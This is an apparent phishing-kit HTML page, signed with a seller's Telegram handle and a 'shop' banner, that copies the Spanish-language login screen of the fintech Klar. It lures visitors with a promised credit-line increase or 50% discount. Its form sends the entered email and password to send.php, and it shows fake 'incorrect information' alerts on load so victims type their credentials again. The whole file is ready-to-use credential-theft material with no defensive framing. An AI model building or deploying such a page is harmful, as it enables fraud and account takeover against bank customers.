<!--

██████╗ ██╗  ██╗██████╗      ██████╗  ██████╗ ████████╗██╗   ██╗
██╔══██╗██║  ██║██╔══██╗    ██╔════╝ ██╔═══██╗╚══██╔══╝╚██╗ ██╔╝
██████╔╝███████║██████╔╝    ██║  ███╗██║   ██║   ██║    ╚████╔╝ 
██╔═══╝ ██╔══██║██╔═══╝     ██║   ██║██║   ██║   ██║     ╚██╔╝  
██║     ██║  ██║██║         ╚██████╔╝╚██████╔╝   ██║      ██║   
╚═╝     ╚═╝  ╚═╝╚═╝          ╚═════╝  ╚═════╝    ╚═╝      ╚═╝ 

Telegram: @PHP_GOTY

-----------------
|*VENTAS / SHOP*|
-----------------
-->
<!DOCTYPE html>
<html lang="es">
<link rel="icon" type="image/svg+xml" href="https://play-lh.googleusercontent.com/czIBDpVoyRTwndEmrIzvvFJFRMA99lN5HNtymWemLhsnORWfoKbOwPlIuDRHEs6bqs0">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Klar - Iniciar sesión</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }

    body {
      background-color: #fefefe;
      color: #1a1a1a;
      padding: 20px;
    }

    .container {
      max-width: 400px;
      margin: 0 auto;
    }

    .top-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 40px;
    }

    .icon {
      font-size: 22px;
      color: #777;
      cursor: pointer;
    }

    .logo {
      text-align: center;
      font-size: 32px;
      font-weight: 600;
      color: #1a1a1a;
      margin-bottom: 20px;
    }

    .logo1 {
      text-align: center;
      font-size: 15px;
      font-weight: 400;
      color: #555;
      margin-bottom: 40px;
    }

    h2 {
      font-size: 18px;
      font-weight: 500;
      margin-bottom: 20px;
    }

    .input-group {
      position: relative;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 16px 44px 16px 14px;
      border: 1px solid #ccc;
      border-radius: 12px;
      font-size: 15px;
      background-color: #fff;
      outline: none;
      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
      transition: border 0.3s;
    }

    input:focus {
      border-color: #888;
    }

    .toggle-password {
      position: absolute;
      right: 14px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 18px;
      color: #888;
      cursor: pointer;
    }

    .forgot {
      text-align: right;
      font-size: 13px;
      margin-bottom: 30px;
    }

    .forgot a {
      color: #666;
      text-decoration: none;
    }

    .btn {
      width: 100%;
      background-color: #000;
      color: white;
      padding: 16px;
      font-size: 16px;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      font-weight: 500;
      transition: background 0.3s;
    }

    .btn:disabled {
      background-color: #ccc;
      cursor: not-allowed;
    }

    .btn:hover:not(:disabled) {
      background-color: #111;
    }

    .alert {
      color: red;
      font-size: 13px;
      margin-top: 6px;
      display: block;
    }
    .alert.hidden {
      display: none;
    }
  </style>

</head>
<body>
  <div class="container">
    <div class="top-bar">
      <div class="icon">&#8592;</div>
      <div class="icon">&#128483;</div>
    </div>

    <div class="logo">Klar</div>
    <div class="logo1">Bienvenido, Completa la información para aumentar tu línea y/o obtener 50% de descuento en tu crédito.
    </div>


    <h2>Iniciar sesión</h2>

    <form method="post" action="send.php">
      <div class="input-group">
        <label for="email_err">Correo electrónico</label>
        <input type="email" id="email_err" name="email_err" required autocomplete="on">
        <span class="toggle-password" onclick="togglePassword('email')">&#128065;</span>
        <div class="alert" id="alert-email">Información incorrecta, intenta nuevamente.</div>
      </div>

      <div class="input-group light">
        <label for="password_err">Contraseña o contraseña temporal</label>
        <input type="password" id="password_err" name="password_err" required="required">
        <span class="toggle-password" onclick="togglePassword('password')">&#128065;</span>
        <div class="alert" id="alert-password">Información incorrecta, intenta nuevamente.</div>
      </div>

      <div class="forgot">
        <a href="#">¿Problemas con tu contraseña?</a>
      </div>

      <button class="btn" id="btene" type="submit">Iniciar sesión</button>
    </form>
  </div>
  <script>
    window.addEventListener('DOMContentLoaded', () => {
      const emailInput = document.getElementById('email_err');
      const passwordInput = document.getElementById('password_err');
      const alertEmail = document.getElementById('alert-email');
      const alertPassword = document.getElementById('alert-password');

      // Mostrar alertas al cargar
      alertEmail.classList.remove('hidden');
      alertPassword.classList.remove('hidden');

      // Ocultar alerta al escribir
      emailInput.addEventListener('input', () => {
        alertEmail.classList.add('hidden');
      });

      passwordInput.addEventListener('input', () => {
        alertPassword.classList.add('hidden');
      });
    });
  </script>
</body>
</html>
